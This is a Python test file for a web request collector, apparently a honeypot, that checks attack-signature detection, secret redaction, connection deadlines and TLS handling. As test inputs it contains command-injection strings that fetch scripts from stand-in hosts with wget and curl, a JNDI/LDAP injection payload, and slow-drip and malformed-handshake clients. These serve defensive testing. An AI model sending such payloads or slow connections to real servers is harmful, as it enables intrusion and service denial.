        ):
            self.assertEqual(ids(path), [], path)
        # A real absolute-form path still matches.
        self.assertEqual(ids("http://example.invalid/developmentserver/metadatauploader"),
                         ["http-sap-netweaver-cve-2025-31324"])
        self.assertEqual(ids("http://example.invalid/.env?a=1"), ["http-sensitive-file-probe"])

    def test_path_rule_registry_invariants(self) -> None:
        for rule in SIGNATURE_RULES:
            if rule.classification == "candidate_cve":
                self.assertTrue(rule.affects_attack_category, rule.signature_id)
        with self.assertRaises(ValueError):
            SignatureRule(
                signature_id="bad-location", rule_version="1.0.0", attack_technique="x",
                classification="indicator_match", match_text=lambda n: None, locations=("header",),
            )
        with self.assertRaises(ValueError):
            SignatureRule(
                signature_id="neutral-cve", rule_version="1.0.0", attack_technique="x",
                classification="candidate_cve", candidate_cves=("CVE-2025-31324",),
                match_text=lambda n: None, affects_attack_category=False,
            )

    def test_path_rules_stay_fast_on_adversarial_paths(self) -> None:
        paths = ["/" + "a/" * 900 + ".env", "/" + ".git/" * 400, "/actuator" + "/a" * 900,
                 "/" + "%2e" * 600 + "env", "/" + "secrets." * 200 + "yaml"]
        start = time.perf_counter()
        for path in paths:
            inspect_http_request(InspectionInput(method="GET", raw_path=path, headers=(), body_bytes=b""))
        self.assertLess(time.perf_counter() - start, 0.5)

    def test_benign_requests_do_not_trigger_false_positives(self) -> None:
        benign_paths = [
            "/articles/how-to-select-a-database?id=42&name=O'Brien",
            "/docs/../about.html",
            "/search?q=union+station&sort=id&order=asc",
            "/api/v1/users?id=100&status=active",
        ]
        for path in benign_paths:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0 (compatible; Test/1.0)"})
            resp = conn.getresponse()
            resp.read()
            self.assertEqual(resp.status, 404)
            conn.close()

        for rec in self._read_records():
            self.assertNotIn("signature_detections", rec["metadata"])
            self.assertNotIn("attack_category", rec)

    def test_redacts_command_injection_callback_urls_in_path_and_headers(self) -> None:
        requests = [
            (
                "/ping?host=127.0.0.1;wget%20http://cmd-evil.invalid/drop.sh",
                {"User-Agent": "$(curl http://ua-evil.invalid/p.sh)"},
            ),
            (
                "/ping?token=supersecret&host=127.0.0.1&&wget%20http://and-evil.invalid/drop.sh",
                {"User-Agent": "Mozilla/5.0"},
            ),
        ]
        for path, headers in requests:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request("GET", path, headers=headers)
            resp = conn.getresponse()
            resp.read()
            self.assertEqual(resp.status, 404)
            conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("cmd-evil.invalid", raw_jsonl)
        self.assertNotIn("ua-evil.invalid", raw_jsonl)
        self.assertNotIn("and-evil.invalid", raw_jsonl)
        self.assertNotIn("supersecret", raw_jsonl)
        records = self._read_records()
        self.assertEqual(len(records), 2)
        for rec in records:
            self.assertEqual(rec["attack_category"], "web_attack_attempt")
            self.assertTrue(
                any(
                    d["signature_id"] == "http-cmd-injection-attempt"
                    for d in rec["metadata"]["signature_detections"]
                )
            )

    def test_masks_all_query_values_encoded_keys_tokens_and_path_secrets(self) -> None:
        jwt = ".".join(["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiIxMjM0NTY3ODkwIn0", "signaturepart123"])
        aws_key = "AKIA" + "IOSFODNN7EXAMPLE"
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            f"/cgi-bin/luci/;stok=deadbeef99/admin?%74%6f%6b%65%6e={jwt}&email=victim@example.invalid&key={aws_key}&flag",
            headers={
                "Referer": "https://alice:s3cr3t@example.invalid/reset/victim@example.invalid?code=999111",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("deadbeef99", raw_jsonl)
        self.assertNotIn("eyJhbGciOiJIUzI1NiJ9", raw_jsonl)
        self.assertNotIn("victim@example.invalid", raw_jsonl)
        self.assertNotIn(aws_key, raw_jsonl)
        self.assertNotIn("alice:s3cr3t", raw_jsonl)
        self.assertNotIn("999111", raw_jsonl)

        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertEqual(
            records[0]["http_path"],
            "/cgi-bin/luci/;stok=[REDACTED]/admin?%74%6f%6b%65%6e=[REDACTED]&email=[REDACTED]&key=[REDACTED]&flag",
        )
        self.assertEqual(
            records[0]["metadata"]["headers"].get("referer"),
            "https://[REDACTED]@example.invalid/reset/[REDACTED]?code=[REDACTED]",
        )

    def test_signature_inspection_stays_fast_on_adversarial_inputs(self) -> None:
        adversarial = InspectionInput(
            method="POST",
            raw_path="/" + ("../" * 600),
            headers=(
                ("User-Agent", "${" * 1000),
                ("X-Custom", "a" + ("/**/" * 400) + "b"),
            ),
            body_bytes=(";" + (" " * 4000)).encode("utf-8"),
        )
        start = time.monotonic()
        for _ in range(50):
            inspect_http_request(adversarial)
        elapsed = time.monotonic() - start
        self.assertLess(elapsed, 2.0)



class SlowClientDeadlineTests(unittest.TestCase):
    """#95: slow clients must not hold connection slots past an absolute deadline."""

    def _server(self, tmp: Path, **overrides):
        overrides.setdefault("metrics_flush_seconds", 0)  # no background writer in tests
        cfg = CollectorConfig(
            host="127.0.0.1",
            port=0,
            protocol_label="http",
            reported_dst_port=80,
            output_jsonl=tmp / "events.jsonl",
            socket_timeout_seconds=1.0,
            max_concurrent_connections=2,
            max_connection_seconds=1.5,
            metrics_path=tmp / "metrics.json",
            **overrides,
        )
        server = create_server(cfg)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        return server, thread

    def _drip(self, port: int, stop: threading.Event) -> None:
        sock = socket.create_connection(("127.0.0.1", port), timeout=5)
        try:
            sock.sendall(b"GET / HTTP/1.1\r\n")
            while not stop.is_set():
                sock.sendall(b"X")  # one header byte, faster than the recv timeout
                time.sleep(0.4)
        except OSError:
            pass  # cut by the server: expected
        finally:
            sock.close()

    def test_dripping_clients_are_cut_and_slots_freed(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server, thread = self._server(Path(d))
            stop = threading.Event()
            drippers = [
                threading.Thread(target=self._drip, args=(server.server_address[1], stop), daemon=True)
                for _ in range(2)
            ]
            try:
                for t in drippers:
                    t.start()
                time.sleep(0.3)
                # Both slots are taken: an honest request is shed now...
                conn = http.client.HTTPConnection("127.0.0.1", server.server_address[1], timeout=3)
                conn.request("GET", "/early")
                self.assertEqual(conn.getresponse().status, 503)
                conn.close()
                # ...but after the absolute deadline the drippers are gone.
                time.sleep(2.0)
                conn = http.client.HTTPConnection("127.0.0.1", server.server_address[1], timeout=3)
                conn.request("GET", "/late")
                self.assertNotEqual(conn.getresponse().status, 503)
                conn.close()
                self.assertGreaterEqual(server.deadline_exceeded, 2)
                self.assertGreaterEqual(server.rejected_overload, 1)
            finally:
                stop.set()
                server.shutdown()
                server.server_close()
                thread.join(timeout=2)

    def test_client_socket_errors_print_no_traceback(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server, thread = self._server(Path(d))
            try:
                with mock.patch("sys.stderr") as err:
                    try:
                        raise BrokenPipeError(32, "Broken pipe")
                    except BrokenPipeError:
                        server.handle_error(None, ("198.51.100.1", 1234))
                    for quiet in (ConnectionResetError(104, "reset"), TimeoutError("t")):
                        try:
                            raise quiet
                        except OSError:
                            server.handle_error(None, ("198.51.100.1", 1234))
                    try:
                        raise ValueError("attacker-controlled detail")
                    except ValueError:
                        server.handle_error(None, ("198.51.100.1", 1234))
                    try:
                        raise PermissionError(13, "events.jsonl not writable")
                    except PermissionError:
                        server.handle_error(None, ("198.51.100.1", 1234))
                written = "".join(c.args[0] for c in err.write.call_args_list)
                self.assertNotIn("Broken pipe", written)
                self.assertNotIn("reset", written)
                self.assertIn("ValueError", written)
                self.assertNotIn("attacker-controlled", written)
                # Filesystem failures stay visible (type only).
                self.assertIn("PermissionError", written)
                self.assertNotIn("not writable", written)
            finally:
                server.shutdown()
                server.server_close()
                thread.join(timeout=2)

    def test_counters_are_written_to_the_metrics_file(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server, thread = self._server(Path(d))
            try:
                server.count("rejected_overload")
                server.count("deadline_exceeded")
                server.count("deadline_exceeded")
                server.write_metrics()
                metrics = json.loads((Path(d) / "metrics.json").read_text())
                self.assertEqual(metrics["rejected_overload"], 1)
                self.assertEqual(metrics["deadline_exceeded"], 2)
                self.assertRegex(metrics["started_at"], r"Z$")
                self.assertEqual((Path(d) / "metrics.json").stat().st_mode & 0o777, 0o640)
            finally:
                server.shutdown()
                server.server_close()
                thread.join(timeout=2)

    def test_failed_metrics_write_is_retried(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server, thread = self._server(Path(d))
            try:
                server.count("rejected_overload")
                with mock.patch("collector.tempfile.mkstemp", side_effect=PermissionError(13, "x")):
                    server.write_metrics()
                self.assertTrue(server._metrics_dirty, "a failed write must stay pending")
                server.write_metrics()
                self.assertEqual(json.loads((Path(d) / "metrics.json").read_text())["rejected_overload"], 1)
                self.assertFalse(server._metrics_dirty)
            finally:
                server.shutdown()
                server.server_close()
                thread.join(timeout=2)

    def test_failed_replace_leaves_no_temp_file(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server, thread = self._server(Path(d))
            try:
                server.count("rejected_overload")
                with mock.patch("collector.os.replace", side_effect=PermissionError(13, "x")):
                    for _ in range(3):
                        server.write_metrics()
                leftovers = list(Path(d).glob(".http-collector-metrics.*"))
                self.assertEqual(leftovers, [])
                self.assertTrue(server._metrics_dirty)
            finally:
                server.shutdown()
                server.server_close()
                thread.join(timeout=2)

    def test_background_worker_refreshes_updated_at_without_changes(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server, thread = self._server(Path(d), metrics_flush_seconds=0.05, metrics_refresh_seconds=0.2)
            try:
                first = json.loads((Path(d) / "metrics.json").read_text())["updated_at"]
                deadline = time.monotonic() + 5
                while time.monotonic() < deadline:
                    time.sleep(0.1)
                    current = json.loads((Path(d) / "metrics.json").read_text())["updated_at"]
                    if current != first:
                        break
                self.assertNotEqual(current, first, "metrics must be rewritten periodically")
            finally:
                server.shutdown()
                server.server_close()
                thread.join(timeout=2)
            # The worker is stopped and joined by server_close.
            self.assertFalse(server._metrics_thread.is_alive())
            (Path(d) / "metrics.json").unlink()
            time.sleep(0.5)
            self.assertFalse((Path(d) / "metrics.json").exists(), "worker kept writing after close")

    def test_worker_start_failure_returns_the_slot(self) -> None:
        """A worker that cannot start (TasksMax) must not leak its slot."""
        with tempfile.TemporaryDirectory() as d:
            server, thread = self._server(Path(d))
            port = server.server_address[1]
            real_start = threading.Thread.start
            calls = {"n": 0}

            def failing_start(self_thread):  # type: ignore[no-untyped-def]
                if self_thread.name.startswith("Thread") and calls["n"] == 0 and getattr(
                    self_thread, "_target", None
                ) == server.process_request_thread:
                    calls["n"] += 1
                    raise RuntimeError("can't start new thread")
                return real_start(self_thread)

            try:
                with mock.patch.object(threading.Thread, "start", failing_start):
                    s = socket.create_connection(("127.0.0.1", port), timeout=3)
                    try:
                        s.recv(16)  # closed without a worker
                    except OSError:
                        pass
                    s.close()
                    time.sleep(0.2)
                self.assertEqual(calls["n"], 1)
                self.assertEqual(server.rejected_overload, 1)
                # Both slots are still available afterwards.
                self.assertTrue(server.connection_semaphore.acquire(blocking=False))
                self.assertTrue(server.connection_semaphore.acquire(blocking=False))
                server.connection_semaphore.release()
                server.connection_semaphore.release()
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
                conn.request("GET", "/after")
                self.assertEqual(conn.getresponse().status, 404)
                conn.close()
            finally:
                server.shutdown()
                server.server_close()
                thread.join(timeout=2)

    def test_fast_requests_are_unaffected_by_the_deadline(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server, thread = self._server(Path(d))
            try:
                for _ in range(5):
                    conn = http.client.HTTPConnection("127.0.0.1", server.server_address[1], timeout=3)
                    conn.request("GET", "/ok")
                    self.assertNotEqual(conn.getresponse().status, 503)
                    conn.close()
                time.sleep(2.0)  # timers of finished connections were cancelled
                self.assertEqual(server.deadline_exceeded, 0)
            finally:
                server.shutdown()
                server.server_close()
                thread.join(timeout=2)


CERT_SCRIPT = Path(__file__).with_name("generate_tls_cert.sh")


def _client_context(cafile: Path) -> ssl.SSLContext:
    ctx = ssl.create_default_context(cafile=str(cafile))
    ctx.check_hostname = True  # the generated SAN is DNS:localhost
    return ctx


class TlsCollectorTests(unittest.TestCase):
    """#93: HTTPS on 443 with a host-generated self-signed certificate."""

    @classmethod
    def setUpClass(cls) -> None:
        cls.certdir = tempfile.TemporaryDirectory()
        tls = Path(cls.certdir.name) / "tls"
        subprocess.run(
            ["bash", str(CERT_SCRIPT), "--dir", str(tls)],
            check=True,
            capture_output=True,
        )
        cls.cert = tls / "cert.pem"
        cls.key = tls / "key.pem"

    @classmethod
    def tearDownClass(cls) -> None:
        cls.certdir.cleanup()

    def _server(self, tmp: Path, **overrides):
        overrides.setdefault("metrics_flush_seconds", 0)
        cfg = CollectorConfig(
            host="127.0.0.1",
            port=0,
            protocol_label="https",
            reported_dst_port=443,
            output_jsonl=tmp / "events.jsonl",
            socket_timeout_seconds=overrides.pop("socket_timeout_seconds", 1.0),
            max_concurrent_connections=overrides.pop("max_concurrent_connections", 4),
            max_connection_seconds=overrides.pop("max_connection_seconds", 1.5),
            metrics_path=tmp / "metrics.json",
            tls_cert_path=self.cert,
            tls_key_path=self.key,
            **overrides,
        )
        server = create_server(cfg)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.addCleanup(thread.join, 2)
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        return server

    def _https_get(self, port: int, path: str, headers: dict | None = None) -> int:
        conn = http.client.HTTPSConnection(
            "localhost", port, timeout=3, context=_client_context(self.cert)
        )
        try:
            conn.request("GET", path, headers=headers or {})
            return conn.getresponse().status
        finally:
            conn.close()

    @staticmethod
    def _records(tmp: Path) -> list[dict]:
        path = tmp / "events.jsonl"
        if not path.exists():
            return []
        return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines() if line]

    def test_records_https_request_with_tls_kind_labels_only(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            tmp = Path(d)
            server = self._server(tmp)
            status = self._https_get(server.server_address[1], "/remote/login?user=admin&password=hunter2")
            self.assertEqual(status, 404)
            [record] = self._records(tmp)
            self.assertEqual(record["protocol"], "https")
            self.assertEqual(record["dst_port"], 443)
            # SNI "localhost" is reduced to a kind; no value is stored anywhere.
            self.assertEqual(record["metadata"]["tls"]["sni_kind"], "hostname")
            self.assertIn(record["metadata"]["tls"]["version"], ("TLSv1.2", "TLSv1.3"))
            raw = (tmp / "events.jsonl").read_text(encoding="utf-8")
            self.assertNotIn("localhost", raw)
            self.assertNotIn("hunter2", raw)

    def test_sni_ip_literal_and_absent_are_classified(self) -> None:
        self.assertEqual(classify_sni(None), "absent")
        self.assertEqual(classify_sni(""), "absent")
        self.assertEqual(classify_sni("203.0.113.7"), "ip_literal")
        self.assertEqual(classify_sni("[2001:db8::1]"), "ip_literal")
        self.assertEqual(classify_sni("vpn.example.com"), "hostname")
        with tempfile.TemporaryDirectory() as d:
            tmp = Path(d)
            server = self._server(tmp)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection(("127.0.0.1", server.server_address[1]), timeout=3) as raw:
                with ctx.wrap_socket(raw) as tls:  # no server_hostname: no SNI
                    tls.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
                    tls.recv(64)
            time.sleep(0.2)
            self.assertEqual(self._records(tmp)[0]["metadata"]["tls"]["sni_kind"], "absent")

    def test_signature_detections_match_on_http_and_https(self) -> None:
        payload = "${jndi:ldap://attacker.example/a}"
        with tempfile.TemporaryDirectory() as d:
            tmp = Path(d)
            server = self._server(tmp)
            self._https_get(server.server_address[1], "/", {"User-Agent": payload})
            https_hits = self._records(tmp)[0]["metadata"]["signature_detections"]
        with tempfile.TemporaryDirectory() as d:
            cfg = CollectorConfig(host="127.0.0.1", port=0, output_jsonl=Path(d) / "e.jsonl")
            plain = create_server(cfg)
            t = threading.Thread(target=plain.serve_forever, daemon=True)
            t.start()
            try:
                conn = http.client.HTTPConnection("127.0.0.1", plain.server_address[1], timeout=3)
                conn.request("GET", "/", headers={"User-Agent": payload})
                conn.getresponse()
                conn.close()
            finally:
                plain.shutdown()
                plain.server_close()
                t.join(timeout=2)
            http_hits = json.loads((Path(d) / "e.jsonl").read_text().splitlines()[0])["metadata"][
                "signature_detections"
            ]
        self.assertTrue(https_hits)
        self.assertEqual(https_hits, http_hits)
        self.assertNotIn("attacker.example", json.dumps(https_hits))

    def test_hostile_handshakes_fail_within_deadline_while_legit_client_is_served(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            tmp = Path(d)
            server = self._server(tmp, max_concurrent_connections=6)
            port = server.server_address[1]
            hostile: list[socket.socket] = []
            # R1: an idle TCP connection that never sends a ClientHello.
            hostile.append(socket.create_connection(("127.0.0.1", port), timeout=5))
            # Plaintext HTTP to the TLS port.
            s = socket.create_connection(("127.0.0.1", port), timeout=5)
            s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
            hostile.append(s)
            # Truncated ClientHello: a handshake record header promising more.
            s = socket.create_connection(("127.0.0.1", port), timeout=5)
            s.sendall(b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03")
            hostile.append(s)
            # Oversized ClientHello: a record far above the TLS record limit.
            s = socket.create_connection(("127.0.0.1", port), timeout=5)
            try:
                s.sendall(b"\x16\x03\x01\xff\xff" + b"\x01" * 65535)
            except OSError:
                pass  # the server may already have closed: fine
            hostile.append(s)
            try:
                time.sleep(0.2)
                started = time.monotonic()
                self.assertEqual(self._https_get(port, "/legit"), 404)
                self.assertLess(time.monotonic() - started, 1.0, "legit client was blocked")
                # Every hostile connection is closed by the server within the deadline.
                for sock in hostile:
                    sock.settimeout(3.0)
                    deadline = time.monotonic() + 3.0
                    while time.monotonic() < deadline:
                        try:
                            if sock.recv(4096) == b"":
                                break
                        except (ConnectionResetError, BrokenPipeError):
                            break
                        except socket.timeout:
                            self.fail("server kept a hostile connection open past the deadline")
                time.sleep(0.3)
                self.assertGreaterEqual(server.tls_handshake_failed, 4)
                # All slots were released.
                for _ in range(6):
                    self.assertTrue(server.connection_semaphore.acquire(blocking=False))
                for _ in range(6):
                    server.connection_semaphore.release()
                # Only the legitimate request was recorded; no raw bytes kept.
                records = self._records(tmp)
                self.assertEqual([r["http_path"] for r in records], ["/legit"])
            finally:
                for sock in hostile:
                    sock.close()

    def test_slow_drip_during_handshake_is_cut_by_the_absolute_deadline(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server = self._server(Path(d), max_connection_seconds=1.0, socket_timeout_seconds=2.5)
            sock = socket.create_connection(("127.0.0.1", server.server_address[1]), timeout=5)
            # A record header promising 255 bytes, then the body one byte at a
            # time: OpenSSL cannot parse (or reject) it until the record is whole.
            hello = b"\x16\x03\x01\x00\xff" + b"\x01" * 255
            started = time.monotonic()
            try:
                for byte in hello:
                    sock.sendall(bytes([byte]))
                    time.sleep(0.3)  # faster than the recv timeout
                    if time.monotonic() - started > 4:
                        break
            except OSError:
                pass  # cut by the server: expected
            finally:
                sock.close()
            self.assertLess(time.monotonic() - started, 3.5)
            time.sleep(0.2)
            self.assertGreaterEqual(server.deadline_exceeded, 1)
            self.assertGreaterEqual(server.tls_handshake_failed, 1)

    def test_overload_on_tls_listener_closes_without_writing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server = self._server(Path(d), max_concurrent_connections=1, max_connection_seconds=3.0)
            port = server.server_address[1]
            holder = socket.create_connection(("127.0.0.1", port), timeout=5)
            try:
                time.sleep(0.2)
                shed = socket.create_connection(("127.0.0.1", port), timeout=3)
                try:
                    try:
                        data = shed.recv(4096)
                    except ConnectionResetError:
                        data = b""
                    self.assertEqual(data, b"", "overload path wrote to an unhandshaken TLS socket")
                finally:
                    shed.close()
                self.assertGreaterEqual(server.rejected_overload, 1)
            finally:
                holder.close()

    def test_rejects_tls_below_1_2_and_offers_only_http11_alpn(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server = self._server(Path(d))
            port = server.server_address[1]
            old = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            old.check_hostname = False
            old.verify_mode = ssl.CERT_NONE
            try:
                old.minimum_version = ssl.TLSVersion.TLSv1
                old.maximum_version = ssl.TLSVersion.TLSv1_1
            except (ValueError, ssl.SSLError):
                self.skipTest("client OpenSSL cannot offer TLS 1.1")
            with socket.create_connection(("127.0.0.1", port), timeout=3) as raw:
                with self.assertRaises((ssl.SSLError, OSError)):
                    with old.wrap_socket(raw) as tls:
                        tls.do_handshake()
            ctx = _client_context(self.cert)
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            with socket.create_connection(("127.0.0.1", port), timeout=3) as raw:
                with ctx.wrap_socket(raw, server_hostname="localhost") as tls:
                    self.assertEqual(tls.selected_alpn_protocol(), "http/1.1")
                    self.assertIn(tls.version(), ("TLSv1.2", "TLSv1.3"))

    def test_handshake_failures_print_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server = self._server(Path(d))
            port = server.server_address[1]
            with mock.patch("sys.stderr") as err:
                for _ in range(3):
                    s = socket.create_connection(("127.0.0.1", port), timeout=3)
                    s.sendall(b"GET / HTTP/1.0\r\n\r\n")
                    try:
                        s.recv(64)
                    except OSError:
                        pass
                    s.close()
                time.sleep(0.3)
            written = "".join(str(c.args[0]) for c in err.write.call_args_list)
            self.assertEqual(written, "")
            self.assertGreaterEqual(server.tls_handshake_failed, 3)

    def test_tls_context_disables_tickets_for_all_versions(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server = self._server(Path(d))
            ctx = server.tls_context
            self.assertEqual(ctx.num_tickets, 0)  # TLS 1.3
            self.assertTrue(ctx.options & ssl.OP_NO_TICKET)  # TLS 1.2
            self.assertTrue(ctx.options & ssl.OP_NO_COMPRESSION)

    def test_metrics_include_tls_handshake_failures(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            server = self._server(Path(d))
            server.count("tls_handshake_failed")
            server.write_metrics()
            data = json.loads((Path(d) / "metrics.json").read_text())
            self.assertEqual(data["tls_handshake_failed"], 1)

    def test_cert_and_key_must_be_configured_together(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaises(ValueError):
                create_server(
                    CollectorConfig(
                        host="127.0.0.1", port=0, output_jsonl=Path(d) / "e.jsonl", tls_cert_path=self.cert
                    )
                )

    def test_cert_script_key_is_private_and_subject_is_generic(self) -> None:
        mode = os.stat(self.key).st_mode & 0o777
        self.assertEqual(mode, 0o600)
        out = subprocess.run(
            ["openssl", "x509", "-in", str(self.cert), "-noout", "-subject", "-issuer", "-text"],
            check=True, capture_output=True, text=True,
        ).stdout.lower()
        for marker in ("attackarium", "opencanary", "honeypot", "canary"):
            self.assertNotIn(marker, out)
        self.assertIn("prime256v1", out)
        self.assertNotIn("private", self.cert.read_text().lower())


if __name__ == "__main__":
    unittest.main()
